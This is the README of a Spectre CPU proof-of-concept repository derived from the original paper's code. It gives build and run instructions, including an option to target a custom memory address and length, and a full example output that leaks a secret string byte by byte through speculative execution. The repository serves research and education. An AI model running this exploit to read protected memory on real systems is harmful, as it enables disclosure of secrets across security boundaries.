# SpectrePoC

Proof of concept code for the Spectre CPU exploit.

## Attribution

The source code originates from the example code provided in the "Spectre Attacks: Exploiting Speculative Execution" paper found here:

https://spectreattack.com/spectre.pdf

The source code in this repository was conveniently provided by Erik August's gist, found here: https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6

The code has been minimally modified to fix build issues and improve comments where possible.

## Building

The project can be built with GNU Make and GCC.

On debian these are included in the `build-essential` metapackage.

Building is as easy as:

`cd SpectrePoC`

`make`

The output binary is `./spectre.out`.

If the target CPU doesn't support the "rdtscp" instruction then the macro "NORDTSCP" must be defined.

`CFLAGS=-DNORDTSCP make`

If you want to build it manually, make sure to disable all optimisations (aka, don't use -O2), as it will break the program.

## Executing

To run specter with default cache hit threshold of 80, and the secret example string "The Magic Words are Squeamish Ossifrage." as the target, run `./spectre.out` with no command line arguments.

**Example:** `./spectre.out`

The cache hit threshold can be specified as the first command line argument. It must be a whole positive integer.

**Example:** `./spectre.out 80`

A custom target address and length can be given as the second and third command line arguments, respectively.

**Example:** `./spectre.out 80 12345678 128`

## Tweaking

If you're getting lackluster results, you may need to tweak the cache hit threshold. This can be done by providing a threshold as the first command line argument.

While a value of 80 appears to work for most desktop CPUs, a larger value may be required for slower CPUs. For example, on a AMD GX-412TC SOC, a value of 100-300 was required to get a good result.

## Contributing

Feel free to add your results to the "Results" issue. Include your cache hit threshold, OS details, CPU details like vendor Id, family, model name, stepping, microcode, Mhz, and cache size. These can be found by running `uname -a` and `cat /proc/cpuinfo`.

## Example output

The following was output on an AMD GX-412TC SOC, with a cache hit threshold of 100:

`./spectre.out 100:`

```
Using a cache hit threshold of 100.
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffdfedc8... Success: 0x54=’T’ score=2
Reading at malicious_x = 0xffffffffffdfedc9... Success: 0x68=’h’ score=2
Reading at malicious_x = 0xffffffffffdfedca... Success: 0x65=’e’ score=2
Reading at malicious_x = 0xffffffffffdfedcb... Success: 0x20=’ ’ score=2
Reading at malicious_x = 0xffffffffffdfedcc... Success: 0x4D=’M’ score=2
Reading at malicious_x = 0xffffffffffdfedcd... Success: 0x61=’a’ score=2
Reading at malicious_x = 0xffffffffffdfedce... Success: 0x67=’g’ score=2
Reading at malicious_x = 0xffffffffffdfedcf... Success: 0x69=’i’ score=2
Reading at malicious_x = 0xffffffffffdfedd0... Success: 0x63=’c’ score=2
Reading at malicious_x = 0xffffffffffdfedd1... Success: 0x20=’ ’ score=2
Reading at malicious_x = 0xffffffffffdfedd2... Success: 0x57=’W’ score=2
Reading at malicious_x = 0xffffffffffdfedd3... Success: 0x6F=’o’ score=2
Reading at malicious_x = 0xffffffffffdfedd4... Success: 0x72=’r’ score=2
Reading at malicious_x = 0xffffffffffdfedd5... Success: 0x64=’d’ score=2
Reading at malicious_x = 0xffffffffffdfedd6... Success: 0x73=’s’ score=2
Reading at malicious_x = 0xffffffffffdfedd7... Success: 0x20=’ ’ score=2
Reading at malicious_x = 0xffffffffffdfedd8... Success: 0x61=’a’ score=2
Reading at malicious_x = 0xffffffffffdfedd9... Success: 0x72=’r’ score=2
Reading at malicious_x = 0xffffffffffdfedda... Success: 0x65=’e’ score=2
Reading at malicious_x = 0xffffffffffdfeddb... Success: 0x20=’ ’ score=2
Reading at malicious_x = 0xffffffffffdfeddc... Success: 0x53=’S’ score=2
Reading at malicious_x = 0xffffffffffdfeddd... Success: 0x71=’q’ score=2
Reading at malicious_x = 0xffffffffffdfedde... Success: 0x75=’u’ score=2
Reading at malicious_x = 0xffffffffffdfeddf... Success: 0x65=’e’ score=2
Reading at malicious_x = 0xffffffffffdfede0... Success: 0x61=’a’ score=2
Reading at malicious_x = 0xffffffffffdfede1... Success: 0x6D=’m’ score=2
Reading at malicious_x = 0xffffffffffdfede2... Success: 0x69=’i’ score=2
Reading at malicious_x = 0xffffffffffdfede3... Success: 0x73=’s’ score=2
Reading at malicious_x = 0xffffffffffdfede4... Success: 0x68=’h’ score=2
Reading at malicious_x = 0xffffffffffdfede5... Success: 0x20=’ ’ score=2
Reading at malicious_x = 0xffffffffffdfede6... Success: 0x4F=’O’ score=2
Reading at malicious_x = 0xffffffffffdfede7... Success: 0x73=’s’ score=2
Reading at malicious_x = 0xffffffffffdfede8... Success: 0x73=’s’ score=2
Reading at malicious_x = 0xffffffffffdfede9... Success: 0x69=’i’ score=2
Reading at malicious_x = 0xffffffffffdfedea... Success: 0x66=’f’ score=2
Reading at malicious_x = 0xffffffffffdfedeb... Success: 0x72=’r’ score=2
Reading at malicious_x = 0xffffffffffdfedec... Success: 0x61=’a’ score=2
Reading at malicious_x = 0xffffffffffdfeded... Success: 0x67=’g’ score=2
Reading at malicious_x = 0xffffffffffdfedee... Success: 0x65=’e’ score=2
Reading at malicious_x = 0xffffffffffdfedef... Success: 0x2E=’.’ score=2
```
